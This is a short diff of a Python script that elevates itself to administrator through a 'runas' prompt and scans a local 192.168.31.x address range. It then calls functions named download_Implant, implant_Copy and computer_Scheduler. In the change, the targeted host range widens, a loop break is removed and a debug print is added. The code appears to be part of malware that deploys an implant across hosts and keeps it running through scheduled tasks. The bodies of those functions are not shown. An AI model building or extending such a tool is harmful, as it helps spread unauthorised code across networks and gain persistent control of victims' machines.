@@ -178,7 +178,7 @@ if __name__ == '__main__':
             params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
             shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
 
-        for ip in range(1,2):
+        for ip in range(7,15):
             netRange = '192.168.31.'
             host = netRange + str(ip)
             hosts.append(host)
@@ -203,12 +203,15 @@ if __name__ == '__main__':
                     debug = 1
                 else:
                     debug = 0
-                break
             else:
                 pass
 
+
+        print(run)
+
         if run == 0:
             sys.exit(1)
+
         download_Implant()
         implant_Copy()
         computer_Scheduler()
